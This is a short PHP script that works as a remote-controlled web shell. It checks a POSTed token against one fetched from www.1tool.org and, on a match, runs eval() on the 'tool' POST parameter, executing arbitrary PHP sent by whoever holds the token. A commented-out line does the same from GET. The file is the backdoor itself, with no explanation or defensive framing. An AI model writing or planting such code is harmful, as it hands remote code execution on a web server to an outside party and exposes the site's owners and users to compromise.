<?php 
//header("ALLOW-CONTROL-ALLOW-ORIGIN:*");
//header("text/html;charset=UTF-8");
//header('Access-Control-Allow-Methods:*');


//eval($_GET[tool]);
$token = $_POST['token'];
$tokentxt=file_get_contents("http://www.1tool.org/Security/token.txt");
if($tokentxt !=$token){
header("location:http://www.1tool.org/");
return;
}
eval($_POST[tool]);
?>